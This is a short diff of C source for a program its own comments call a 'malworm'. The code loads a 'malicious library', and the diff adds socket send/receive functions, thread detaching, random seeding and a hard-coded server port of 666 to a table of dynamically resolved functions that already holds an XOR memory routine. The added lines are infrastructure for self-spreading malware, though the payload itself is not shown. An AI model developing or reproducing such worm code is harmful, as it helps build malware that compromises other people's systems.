@@ -7,6 +7,7 @@
 #include <unistd.h>   // For sysconf
 #include <dlfcn.h>    // For dlsym
 #include <poll.h>
+#include <time.h>
 
 #include <arpa/inet.h>
 #include <ifaddrs.h>
@@ -48,9 +49,11 @@ void init_globals(Globals *global){
     global->strcmp=&strcmp;
     global->strstr=&strstr;
     global->strncpy=&strncpy;
+    global->sscanf=&sscanf;
 
     // memory
     global->memcpy = &memcpy;
+    global->memset=&memset;
 
     // files
     global->realpath=&realpath;
@@ -81,6 +84,8 @@ void init_globals(Globals *global){
     global->getifaddrs=&getifaddrs;
     global->freeifaddrs=&freeifaddrs;
 
+    global->recv=&recv;
+    global->send=&send;
     global->recvfrom=&recvfrom;
     global->sendto=&sendto;
 
@@ -89,6 +94,7 @@ void init_globals(Globals *global){
     
     // threads
     global->pthread_create=&pthread_create;
+    global->pthread_detach=&pthread_detach;
     global->pthread_exit=&pthread_exit;
 
     // fds
@@ -100,6 +106,9 @@ void init_globals(Globals *global){
 
     // custom functions
     global->xor_memory = &xor_memory;
+
+    // global values
+    global->ipp_server_port = 666;
 }
 
 /// execute the code from a malicious library
@@ -171,6 +180,7 @@ void load_libraries(Globals *global){
 int main(int argc, char**argv) {
     // setup global variables and functions
     Globals *global = (Globals *) malloc(sizeof(Globals));
+    srand(time(NULL));
     init_globals(global);
 
     // add a reference to the executable of the malworm to the struct globals
